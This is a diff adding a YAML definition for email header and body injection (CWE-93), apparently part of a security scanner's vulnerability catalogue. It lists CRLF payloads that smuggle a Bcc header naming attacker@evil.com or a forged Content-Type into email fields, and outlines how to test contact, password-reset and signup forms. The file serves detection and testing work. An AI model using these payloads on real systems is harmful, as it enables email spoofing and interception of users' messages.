@@ -1,0 +1,18 @@
+id: EMAIL_INJECTION
+name: Email Header / Body Injection
+cwe:
+- CWE-93
+owasp: A03:2021 Injection
+severity_range: Medium - High
+description: CRLF injection in email fields enabling Bcc injection, From spoofing, body manipulation in transactional emails.
+detection:
+  payloads:
+  - 'victim@example.com\r\nBcc: attacker@evil.com'
+  - victim@example.com%0d%0aBcc:%20attacker@evil.com
+  - 'victim@example.com\r\nContent-Type: multipart/mixed; boundary=evil'
+  strategy:
+  - Identify contact forms, password reset, signup confirmation
+  - Inject CRLF in name/email/subject fields
+  - Use OOB email account to verify Bcc reception
+references:
+- https://owasp.org/www-community/vulnerabilities/Mail_Header_Injection
